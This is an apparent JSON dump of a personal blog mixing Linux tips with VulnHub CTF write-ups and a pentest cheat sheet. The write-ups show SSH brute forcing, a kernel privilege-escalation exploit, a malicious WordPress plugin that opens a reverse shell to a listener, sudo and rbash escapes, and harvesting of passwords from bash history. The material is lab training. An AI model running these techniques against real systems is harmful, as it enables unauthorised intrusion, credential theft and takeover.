groups&#x3D;1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth) # whoami root flag.txt cat &#x2F;root&#x2F;flag.txt _________ | _ _ | |_&#x2F; | | \\_|.--. _ .--. _ .--. .--. | | &#x2F; .&#39;&#96;\\ \\[ &#39;&#x2F;&#39;&#96;\\ \\[ &#39;&#x2F;&#39;&#96;\\ \\&#x2F; .&#39;&#96;\\ \\ _| |_ | \\__. | | \\__&#x2F; | | \\__&#x2F; || \\__. | |_____| &#39;.__.&#39; | ;.__&#x2F; | ;.__&#x2F; &#39;.__.&#39; [__| [__| Congratulations ! there is your flag : 0wnedlab&#123;p4ssi0n_c0me_with_pract1ce&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Wallpaper selector with sxiv","slug":"Walpaper_selector_with_sxiv","date":"2022-01-22T01:35:56.000Z","updated":"2022-09-27T07:49:09.721Z","comments":true,"path":"/post/Walpaper_selector_with_sxiv.html","link":"","permalink":"https://peanutstick.github.io/post/Walpaper_selector_with_sxiv.html","excerpt":"","text":"What it doesIt will change my walpaper and colors of my polybar theme and firefox. What do I usenitrogen for the wallpaper,pywal for my color scheme,pywal for for the colors of firefox. WalpI have a script to change everything but without sxiv.You have to copy this code somewhere in your path, mine is in /usr/local/bin/walp.You can type echo $PATH to see more options. ➜ ~ cat $(where walp) nitrogen --set-scaled &quot;$1&quot; wal -i &quot;$1&quot; pywalfox update sxivYou can type this command to see the images in your current folder. sxiv -t -a * I’m gonna use this one to select my future walpaper. walp $(sxiv -t -a -o ~&#x2F;Pictures&#x2F;*) You have to select the walpaper with the key m and press q to leave.It’s working well but I was to start it via dmenu because I’m too lazy to type the command. dmenuI like the command walp, I will modify it. if [ -z $1]; then walp $(sxiv -t -a -o ~&#x2F;Pictures&#x2F;*) fi nitrogen --set-scaled &quot;$1&quot; wal -i &quot;$1&quot; pywalfox update","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF cybersploit","slug":"CTF_cybersploit","date":"2022-01-21T19:19:23.000Z","updated":"2022-09-27T07:49:09.508Z","comments":true,"path":"/post/CTF_cybersploit.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_cybersploit.html","excerpt":"","text":"DescriptionTHIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM.FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER &amp; EXPLOIT-DB. netdiscover192.168.0.42 nmapnmap -sV -p- 192.168.0.42 22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.2.22 ((Ubuntu)) port 80 robots.txtR29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 I think it’s base64. ➜ ~ echo R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 | base64 --decode Good Work ! Flag1: cybersploit&#123;youtube.com&#x2F;c&#x2F;cybersploit&#125;% Source code &lt;!-------------username:itsskv---------------------&gt; GifIn the gif we have this code.I don’t know what to do with it.It’s not in hexadecimal because there is a P and S. B2C B2B PSD RGB Port 22I did a wordlist with the words in the gif and the website.https://weakpass.com/generateSeriously:And th password was the flag. hydra -l itsskv -P cyberwordlist -s 22 -f 192.168.0.42 ssh [22][ssh] host: 192.168.0.42 login: itsskv password: cybersploit&#123;youtube.com&#x2F;c&#x2F;cybersploit&#125; flag2.txtitsskv@cybersploit-CTF:~$ ls Desktop Downloads flag2.txt Pictures Templates Documents examples.desktop Music Public Videos itsskv@cybersploit-CTF:~$ cat flag2.txt 01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101 good work ! flag2: cybersploit&#123;https:t.me&#x2F;cybersploit1&#125; LSE.sh Hostname: cybersploit-CTF Linux: 3.13.0-32-generic Distribution: Ubuntu 12.04.5 LTS Architecture: i686 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;bin&#x2F;X &#x2F;usr&#x2F;bin&#x2F;lppasswd --- [*] fst080 Can we read subdirectories under &#x2F;home?......................... yes! [*] fst100 Useful binaries................................................. yes! I have one thing interestion, the ubuntu version. Exploithttps://www.exploit-db.com/exploits/37292I can’t download andd vi crash when I use it, that’s why I use nano. itsskv@cybersploit-CTF:~$ touch exp.c itsskv@cybersploit-CTF:~$ itsskv@cybersploit-CTF:~$ nano exp.c itsskv@cybersploit-CTF:~$ gcc exp.c -o exp itsskv@cybersploit-CTF:~$ ./exp spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library # id uid=0(root) gid=0(root) groups=0(root),1001(itsskv) finalflag.txtroot@cybersploit-CTF:&#x2F;home&#x2F;itsskv# cat &#x2F;root&#x2F;finalflag.txt ______ ____ ____ .______ _______ .______ _______..______ __ ______ __ .___________. &#x2F; |\\ \\ &#x2F; &#x2F; | _ \\ | ____|| _ \\ &#x2F; || _ \\ | | &#x2F; __ \\ | | | | | ,----&#39; \\ \\&#x2F; &#x2F; | |_) | | |__ | |_) | | (----&#96;| |_) | | | | | | | | | &#96;---| |----&#96; | | \\_ _&#x2F; | _ &lt; | __| | &#x2F; \\ \\ | ___&#x2F; | | | | | | | | | | | &#96;----. | | | |_) | | |____ | |\\ \\----.----) | | | | &#96;----.| &#96;--&#39; | | | | | \\______| |__| |______&#x2F; |_______|| _| &#96;._____|_______&#x2F; | _| |_______| \\______&#x2F; |__| |__| _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s ) \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; flag3: cybersploit&#123;Z3X21CW42C4 many many congratulations !&#125; if you like it share with me https:&#x2F;&#x2F;twitter.com&#x2F;cybersploit1. Thanks !","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF unknowndevice64-1","slug":"CTF_unknowndevice64-1","date":"2022-01-19T19:51:42.000Z","updated":"2022-09-27T07:49:10.848Z","comments":true,"path":"/post/CTF_unknowndevice64-1.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_unknowndevice64-1.html","excerpt":"","text":"IntroDescription: unknowndevice64 v1.0 is a medium level boot2root challenge. The OVA has been tested on both VMware and Virtual Box. Difficulty: Intermediate Flags: Your Goal is to get root and read /root/flag.txt Networking: DHCP: Enabled IP Address: Automatically assigned Hint: Follow your intuitions … and enumerate! and for any questions, feel free to contact me on Twitter: @unknowndevice64 Happy Hacking..!!! Scannetdiscover192.168.0.40 nmapnmap 192.168.0.40 -sV -p- python http server In the source code we can found this picture.http://192.168.0.40:31337/key_is_h1dd3n.jpgIt’s interesting, I will do someting on it later. niktonothing interesting Metadatadentify -verbose key_is_h1dd3n.jpg Nothing interesting file key_is_h1dd3n.jpg key_is_h1dd3n.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 300x300, components 1 Crack key_is_h1dd3n.jpgI use this tool.https://github.com/Paradoxis/StegCracker echo &quot;h1dd3n&quot; &gt; ahhh.txt stegcracker key_is_h1dd3n.jpg ahhh.txt ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.—————–.&lt;—————-.–.++++++.———.&gt;———————–.&lt;&lt;+++.++.&gt;+++++.–.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.—————–. This is the output, the password was h1dd3n, it’s write in the file name lol. decoder detectorhttps://www.dcode.fr/identification-chiffrement I have to use brainfuck. Decode brainfuckSeriously, I was stuck on this web page for 2 minutes because I was unable to see the output on the left… ud64:1M!#64@ud sshssh ud64@192.168.0.40 -p 1337 password:1M!#64@ud It’s broken everywhere.-rbash: /bin/ls: restricted: cannot specify `/‘ in command namesBut I can use vi. $PATHThe PATH variable is almost empty. ud64@unknowndevice64_v1:~$ echo $PATH &#x2F;home&#x2F;ud64&#x2F;prog ud64@unknowndevice64_v1:~$ export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;bin -rbash: PATH: readonly variable There is something in prog.I use TAB to show what is in the directory. ud64@unknowndevice64_v1:~$ ls .bash_history .screenrc Downloads&#x2F; Public&#x2F; web&#x2F; .bash_profile Desktop&#x2F; Music&#x2F; Videos&#x2F; .config&#x2F; Documents&#x2F; Pictures&#x2F; prog&#x2F; ud64@unknowndevice64_v1:~$ ls prog&#x2F; date id vi whoami I have edited the .bash_profile to change the PATH. PATH&#x3D;$HOME&#x2F;prog:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin Some commands still don’t work but it’s good for python python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; Now everything is working. sudo -lud64@unknowndevice64_v1:~$ sudo -l User ud64 may run the following commands on unknowndevice64_v1: (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;sysud64 Let’s try it. sudo &#x2F;usr&#x2F;bin&#x2F;sysud64 su Oh god, it’s broken everywhere, but I’m root, gg wp. sysud64ud64@unknowndevice64_v1:~$ sudo &#x2F;usr&#x2F;bin&#x2F;sysud64 -V strace -- version 4.22 Copyright (c) 1991-2018 The strace developers &lt;https:&#x2F;&#x2F;strace.io&gt;. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Optional features enabled: stack-unwind stack-demangle m32-mpers mx32-mpers It’s strace. let’s see in gtfobin what we can do.https://gtfobins.github.io/gtfobins/strace/strace -o /dev/null /bin/shSo for me it will be: sudo &#x2F;usr&#x2F;bin&#x2F;sysud64 -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh )","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Record screen with ffmpeg","slug":"Record_screen_with_ffmpeg","date":"2022-01-19T00:56:09.000Z","updated":"2022-09-27T07:49:11.008Z","comments":true,"path":"/post/Record_screen_with_ffmpeg.html","link":"","permalink":"https://peanutstick.github.io/post/Record_screen_with_ffmpeg.html","excerpt":"","text":"ffmpeg -video_size 1920x1080 -framerate 60 / # Resolution + framerate-f x11grab -i :0.0+0,0 / # screen-f pulse -i alsa_output.pci-0000_00_1f.3.analog-stereo.monitor test3.mkv # Audio You can have the audio input with: pacmd list-sources ffmpeg -video_size 1920x1080 -framerate 60 -f x11grab -i :0.0+0,0 -f pulse -i alsa_output.pci-0000_00_1f.3.analog-stereo.monitor test3.mkv","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF commands and files","slug":"CTF_commands_and_files","date":"2022-01-17T21:55:38.000Z","updated":"2022-10-07T12:40:53.878Z","comments":true,"path":"/post/CTF_commands_and_files.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_commands_and_files.html","excerpt":"","text":"Revers shellPythonhttps://docs.j7k6.org/wordpress-malicious-plugin-reverse-shell-metasploit/ Shellhttps://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Spawn ttyhttps://netsec.ws/?p=337 python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;) &#x2F;bin&#x2F;sh -i perl —e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39; perl: exec &quot;&#x2F;bin&#x2F;sh&quot;; ruby: exec &quot;&#x2F;bin&#x2F;sh&quot; lua: os.execute(&#39;&#x2F;bin&#x2F;sh&#39;) (From within IRB) exec &quot;&#x2F;bin&#x2F;sh&quot; (From within vi) :!bash (From within vi) :set shell&#x3D;&#x2F;bin&#x2F;bash:shell (From within nmap) !sh Python serverpython -m SimpleHTTPServer 80 Enumerationrunning processhttps://github.com/DominicBreuker/pspy/releases/tag/v1.2.0 linenumhttps://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh Unix priveschttps://pentestmonkey.net/tools/audit/unix-privesc-check Linprivchecker.pyhttps://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py Websites‘https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html&#39; Commandscat &#x2F;home&#x2F;*&#x2F;.bash_his* cat &#x2F;etc&#x2F;passwd Privescsudo -l find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; find . -perm &#x2F;4000 find . -perm &#x2F;2000 find . -perm &#x2F;6000 directory traversalhttps://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/ &#x2F;proc&#x2F;sched_debug &#x2F;proc&#x2F;mounts &#x2F;proc&#x2F;net&#x2F;arp &#x2F;proc&#x2F;net&#x2F;route &#x2F;proc&#x2F;net&#x2F;tcp and &#x2F;proc&#x2F;net&#x2F;udp &#x2F;proc&#x2F;net&#x2F;fib_trie &#x2F;proc&#x2F;version &#x2F;proc&#x2F;[PID]&#x2F;cmdline &#x2F;proc&#x2F;[PID]&#x2F;environ &#x2F;proc&#x2F;[PID]&#x2F;cwd &#x2F;proc&#x2F;[PID]&#x2F;fd&#x2F;[#]","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"set up smb","slug":"set_up_smb","date":"2022-01-16T04:01:27.000Z","updated":"2022-09-27T07:49:10.078Z","comments":true,"path":"/post/set_up_smb.html","link":"","permalink":"https://peanutstick.github.io/post/set_up_smb.html","excerpt":"","text":"Installationsudo pacman -S samba gvfs gvfs-smb # install relevant samba packages sudo nano /etc/samba/smb.conf (if it’s empty get a default smb.conf from Samba Git Repository and paste it into. Under [global] set:workgroup = WORKGROUP sudo systemctl start smbd nmbd # start samba now ClientsNautilusIt’s easy to use, you have to click to ‘another location’ and connect to a server:smb://IP You gonna see your shared files.Now if you want to browse them via CLI:/run/user/&lt;username&gt;/gvfs/&lt;share point&gt; smbclientsmbclient -L &lt;server&gt; # To list the shares smbclient &#x2F;&#x2F;serveur&#x2F;partage # To connect to the share","categories":[{"name":"Service","slug":"Service","permalink":"https://peanutstick.github.io/categories/Service/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF Stapler","slug":"CTF_Stapler","date":"2022-01-15T00:07:29.000Z","updated":"2022-09-27T07:49:09.821Z","comments":true,"path":"/post/CTF_Stapler.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_Stapler.html","excerpt":"","text":"Discoveryhttps://www.vulnhub.com/entry/stapler-1,150/ Scanningnetdiscoversudo netdiscover 192.168.0.34 nmapsudo nmap 192.168.0.34 -sV -p- 12 open ports: ftpftp connect 192.168.0.34 Connected to &#102;&#x74;&#112;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#48;&#46;&#51;&#52;.220-220-|—————————————————————————————–|220-| Harry, make sure to update the banner when you get a chance to show who has access here |220-|—————————————————————————————–|220- We have a username: harry ftp&gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 107 Jun 03 2016 note 226 Directory send OK. ftp&gt; get note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (107 bytes). 226 Transfer complete. 107 bytes received in 0,000452 seconds (231 kbytes&#x2F;s) Let’s what is in the note. cat ~&#x2F;note &#96;Elly&#96;, make sure you update the payload information. Leave it in your FTP account once your are done, &#96;John&#96;. Now we have 3 usersneme: harry, Elly and John We have to connect with Elly to find the &#96;payload information&#96;. httpdirbAfter a scan on the port 80 we have this: ---- Scanning URL: http:&#x2F;&#x2F;192.168.1.27:80&#x2F; ---- + http:&#x2F;&#x2F;192.168.1.27:80&#x2F;.bashrc (CODE:200|SIZE:3771) + http:&#x2F;&#x2F;192.168.1.27:80&#x2F;.profile (CODE:200|SIZE:675) .bashrc # If not running interactively, don&#39;t do anything case $- in *i*) ;; *) return;; esac # don&#39;t put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL&#x3D;ignoreboth # append to the history file, don&#39;t overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE&#x3D;1000 HISTFILESIZE&#x3D;2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern &quot;**&quot; used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x &#x2F;usr&#x2F;bin&#x2F;lesspipe ] &amp;&amp; eval &quot;$(SHELL&#x3D;&#x2F;bin&#x2F;sh lesspipe)&quot; # set variable identifying the chroot you work in (used in the prompt below) if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r &#x2F;etc&#x2F;debian_chroot ]; then debian_chroot&#x3D;$(cat &#x2F;etc&#x2F;debian_chroot) fi # set a fancy prompt (non-color, unless we know we &quot;want&quot; color) case &quot;$TERM&quot; in xterm-color|*-256color) color_prompt&#x3D;yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt&#x3D;yes if [ -n &quot;$force_color_prompt&quot; ]; then if [ -x &#x2F;usr&#x2F;bin&#x2F;tput ] &amp;&amp; tput setaf 1 &gt;&amp;&#x2F;dev&#x2F;null; then # We have color support; assume it&#39;s compliant with Ecma-48 # (ISO&#x2F;IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt&#x3D;yes else color_prompt&#x3D; fi fi if [ &quot;$color_prompt&quot; &#x3D; yes ]; then PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ &#39; else PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h:\\w\\$ &#39; .profil if [ -n &quot;$BASH_VERSION&quot; ]; then # include .bashrc if it exists if [ -f &quot;$HOME&#x2F;.bashrc&quot; ]; then . &quot;$HOME&#x2F;.bashrc&quot; fi fi # set PATH so it includes user&#39;s private bin if it exists if [ -d &quot;$HOME&#x2F;bin&quot; ] ; then PATH&#x3D;&quot;$HOME&#x2F;bin:$PATH&quot; fi BrowsingOn the port 12380 we have this.We have this comment:A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you!Now we have 5 usernames:harry, Elly, Tim, John and Zoe Nikto on 12380+ Entry &#39;&#x2F;admin112233&#x2F;&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry &#39;&#x2F;blogblog&#x2F;&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + &#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found + &quot;robots.txt&quot; contains 2 entries which should be manually viewed. You have to entry with https, or it will fail.In the robots.txt we have /admin112233/ and /blogblog/https://192.168.0.34:12380/admin112233/:https://192.168.0.34:12380/blogblog/:It’s using wordpress, here is the login page:https://192.168.0.34:12380/blogblog/wp-login.php wpscanwpscan --disable-tls-checks --url https:&#x2F;&#x2F;192.168.0.34:12380&#x2F;blogblog&#x2F; --enumerate ap --enumerate at --enumerate u --enumerate vp --enumerate cb Upload directory has listing enabled: https://192.168.0.34:12380/blogblog/wp-content/uploads/WordPress version 4.2.1 identified (Insecure, released on 2015-04-27). wpscan --disable-tls-checks --url https:&#x2F;&#x2F;192.168.0.34:12380&#x2F;blogblog&#x2F; --enumerate u We have some users.tim, kathy, scott, heather, peter, elly, barry, harry, John Smith, john, garryThe main user is john:wpscan –url https://192.168.0.34:12380/blogblog/ –wordlist ~/Documents/wordlist/rockyou.txt –username John –threads 100It’s not working Port 666On the port 666 we have this. Port 139139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) It’s a samba server.I found nothing interesting in the backups.You can also use nautilus to download and browse in the smb server. ExploitBrute force metasploitI’ve done a bruteforce with metasploit with the wordlist rockyou and the user john, because he is the one who manage the website.The password is incorrect. upload a revers shellYou can upload files in wordpress.https://192.168.0.34:12380/blogblog/wp-admin/plugin-install.php?tab=upload I’v tried with this one:https://docs.j7k6.org/wordpress-malicious-plugin-reverse-shell-metasploit/ wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wetw0rk&#x2F;malicious-wordpress-plugin&#x2F;master&#x2F;wordpwn.py python wordpwn.py 192.168.0.21 4444 Y Then, unzip the file and upload wetw0rk_maybe.phpOpen it via this link:https://192.168.0.34:12380/blogblog/wp-content/uploads/ Now you should have a meterpreter. linenum.sh Hostname: red.initech Linux: 4.4.0-21-generic Distribution: Ubuntu 16.04 LTS &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( users )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] usr020 Are there other users in administrative groups?................. yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [*] fst080 Can we read subdirectories under &#x2F;home?......................... yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( network )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] net000 Services listening only on localhost............................ yes! I think the kernel can be exploited but I have to finish the reco first. find &#x2F;home peter is diferent, I think he can use sudo./home/peter/.sudo_as_admin_successful Let’s see deeper. cat &#x2F;home&#x2F;*&#x2F;.bash_hi* We have JKanode and peter, peter can use sudo so let’s go for peter. sshpass -p thisimypassword ssh JKanode@localhost apt-get install sshpass sshpass -p JZQuyIN5 peter@localhost SSH peterssh peter@192.168.0.34 JZQuyIN5 Enum sudosudo -l User peter may run the following commands on red: (ALL : ALL) ALL sudo su We are root.Let’s get this flag.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Create a polybar module","slug":"Create_a_polybar_module","date":"2022-01-12T22:09:01.000Z","updated":"2022-09-27T07:49:09.558Z","comments":true,"path":"/post/Create_a_polybar_module.html","link":"","permalink":"https://peanutstick.github.io/post/Create_a_polybar_module.html","excerpt":"","text":"WhyI had xfce4 panel, and I miss some informations like the remaining battery. CodeConfig polybarIn the config file ./config.polybar/config. [module&#x2F;discharge] type &#x3D; custom&#x2F;script exec &#x3D; ~&#x2F;.config&#x2F;polybar&#x2F;discharge.sh format-underline &#x3D; $&#123;colors.white&#125; You also have to tell where gonna be the output.In the config file: modules-right &#x3D; filesystem xbacklight alsa pulseaudio wlan eth battery discharge date powermenu You have to add the name of your module, but it can be where you want. ScriptIn ./config/polybar/discharge.sh` #! &#x2F;bin&#x2F;bash a&#x3D;$(upower -i &#96;upower -e | grep &#39;BAT&#39;&#96; |grep &quot;time to&quot;) echo $a It’s ugly, I will change the text later.","categories":[{"name":"Programing","slug":"Programing","permalink":"https://peanutstick.github.io/categories/Programing/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"Replacing xfce4 bar by Polybar","slug":"Replacing_xfce4_bar_by_Polybar","date":"2022-01-11T23:57:59.000Z","updated":"2022-09-27T07:49:11.154Z","comments":true,"path":"/post/Replacing_xfce4_bar_by_Polybar.html","link":"","permalink":"https://peanutstick.github.io/post/Replacing_xfce4_bar_by_Polybar.html","excerpt":"","text":"WhyBecause I don’t use the menu of xfce and the the display of my desktops is a bit ugly.I have dmenu to run everythings I need.I would like to use pywal on my polybar. It can look a bit stupid because if I don’t use the xfce4 bar and WM why do I still keep it?It’s because with my last setup (I3 + polybar) I had 2 hours of battery max, now I’m at 6. HowInstall PolybarI already have polybar. sh ~&#x2F;.config&#x2F;polybar&#x2F;launch.sh If yiu have an error you have to recompile polybar. This is how it’s look like.This is the instalation guide.https://wiki.archlinux.org/title/Polybar#Installation Set polybar at startupI use BSPWM so I have to edit my bspwmrc.~/.config/bspwm/bspwmrc $HOME&#x2F;.config&#x2F;polybar&#x2F;launch.sh For me it’s not working, I have to lunch it via xfce4.I have to open xfce4 setting manager and sessions and startup. Config polybarwalI want it to work with wal, if I change my walpaper every thing have to change. This is how you can get the colors, it’s not needed here.. source &quot;$HOME&#x2F;.cache&#x2F;wal&#x2F;colors.sh&quot; echo $color0 #596398 instead of background = #222 you have to set background = $&#123;xrdb:color2&#125;I’m testing it with polybar example. background-alt &#x3D; $&#123;xrdb:color2&#125; background &#x3D; $&#123;xrdb:color1&#125; foreground &#x3D; $&#123;xrdb:color0&#125;f foreground-alt &#x3D; $&#123;xrdb:color0&#125; primary &#x3D; $&#123;xrdb:color5&#125; secondary &#x3D; $&#123;xrdb:color5&#125; alert &#x3D; $&#123;xrdb:color7&#125; ShapeRemove xfce4 panelI don’t see how I can disable it at 